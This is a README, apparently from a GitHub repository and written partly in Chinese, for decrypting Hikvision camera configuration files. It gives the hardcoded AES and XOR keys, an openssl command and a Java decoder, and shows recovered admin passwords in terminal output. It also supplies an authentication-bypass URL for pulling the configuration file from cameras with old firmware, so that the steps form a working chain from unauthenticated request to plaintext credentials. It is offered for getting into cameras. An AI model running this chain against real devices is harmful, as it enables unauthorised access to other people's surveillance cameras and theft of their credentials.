# Hikvision Decrypter (AES+XOR)

## 0x01 AES ECB 128 Decrypt

```
unsigned char* aesKey = new unsigned char[16]{ 0x27, 0x99, 0x77, 0xf6, 0x2f, 0x6c, 0xfd, 0x2d, 0x91, 0xcd, 0x75, 0xb8, 0x89, 0xce, 0x0c, 0x9a };
```

**`aesKey=279977f62f6cfd2d91cd75b889ce0c9a`**

利用OpenSSL解密 -aes-128-ecb

Ubuntu 系统下：

`openssl enc -d -in configurationFile -out decryptedoutput -aes-128-ecb -K 279977f62f6cfd2d91cd75b889ce0c9a -nosalt -md md5`

得到解密文件decryptedoutput
```
╭─root@Ubuntu18 /tmp/test
╰─# openssl enc -d -in configurationFile -out decryptedoutput -aes-128-ecb -K 279977f62f6cfd2d91cd75b889ce0c9a -nosalt -md md5
╭─root@Ubuntu18 /tmp/test
╰─# hash256 decryptedoutput
971cf177d8d952a4eeaf2274d67dc464e0711550a742099fefca6ddd9da4b13a  decryptedoutput
╭─root@Ubuntu18 /tmp/test
╰─#
```
## 0x02 Xor Decrypt

`unsigned char* xorKey = new unsigned char[4]{ 0x73, 0x8B, 0x55, 0x44 };`

`xorKey = 0x73, 0x8B, 0x55, 0x44`


#### XORDecode.java

```
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;

class XORDecode {
    public static void main(String[] args) throws IOException {
        
        File file = new File("decryptedoutput");//解密文件
        byte[] fileContents = Files.readAllBytes(file.toPath());
        byte[] xorOutput = new byte[fileContents.length];

        byte[] key = {(byte) 0x73, (byte) 0x8B, (byte) 0x55, (byte) 0x44};

        for (int i = 0; i < fileContents.length; i++) {
            xorOutput[i] = (byte) ((int) fileContents[i] ^ (int) key[i % key.length]);
        }

        FileOutputStream stream = new FileOutputStream("plaintextOutput");
        stream.write(xorOutput);


    }
}
```

```
╭─root@Ubuntu18 /tmp/test
╰─# javac XORDecode.java
╭─root@Ubuntu18 /tmp/test
╰─# java XORDecode
╭─root@Ubuntu18 /tmp/test
╰─# hash256 plaintextOutput
243a4e96f4e1313fe32bcc510988d5a65b4474179ca7ec92bdb66b397d8a66b6  plaintextOutput
╭─root@Ubuntu18 /tmp/test
╰─# string plaintextOutput > s.txt

```

利用grep 匹配admin上一行和下一行的内容

```
  -B, --before-context=NUM  print NUM lines of leading context
  -A, --after-context=NUM   print NUM lines of trailing context
```

```
╭─root@Ubuntu18 /tmp/test
╰─# cat s.txt|grep -B 1  -A 1 'admin'
www.hik-online.com
admin
12345
--
700783721
admin
ww123456
╭─root@Ubuntu18 /tmp/test
╰─#
```

得到密码为 **`ww123456`**



~~**FYI this script is soon going to be replaced. I am actively working on an all-encompassing utility that does all the steps listed below**~~

**After a year of putting it off, I finally got around to building said all-encompassing utility. It can be found [here](https://github.com/WormChickenWizard/hikvision-decrypter)**

Hikvision configuration files use two layers of encryption, 

It first XOR encrypts the configuration file then it proceed to encrypt it with aes 128-bit ecb encryption(electronic codebook).

## Notes

I might as well add this for reference far into the future: this was written in java version 8u191
if for whatever reason you are running into problems, use that version instead.

## Obtaining the Hikvision configuration file

If you are trying to get into a Hikvision camera with an old firmware, 
use this link to get the camera's configuration file: 
```
http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK
```
Just make sure to substitute camera.ip with the ip address of the camera.

## Steps for breaking the AES encryption on the configuration file

Now that you have the configuration file, if you are on windows download the ubuntu subsystem and install openssl.
Once installed, navigate to the location where the config file is and run the following command:
```
openssl enc -d -in configurationFile -out decryptedoutput -aes-128-ecb -K 279977f62f6cfd2d91cd75b889ce0c9a -nosalt -md md5
```
You should have a new file called "decryptedoutput". This file has the AES encryption broken but, but still is XOR encoded which is where the script I wrote comes into play.

## XOR decode script compilation and using

I'm going to make the assumption that the jdk is installed and the path variable is setup correctly

1.) Clone this repository (or download the zip whatever is easier)

2.) Navigate to XORDecode.java in a command prompt and run:
```
javac XORDecode.java
```
3.) Make a new folder and put the resulting .class file in there as well as the decryptedoutput file

4.) Open command prompt in that folder you just made with the two files inside it and run:
```
java XORDecode
```
5.) You now should get a plaintextOutput file. Congratulations!

Supposedly this is a sqlite3 database. Problem is You can't open it in a normal text editor like notepad

If you have a database viewer you are more than welcome to use it.
For simplicity's sake, I used a hex editor to view its contents. I personally use Frhed which works fine.
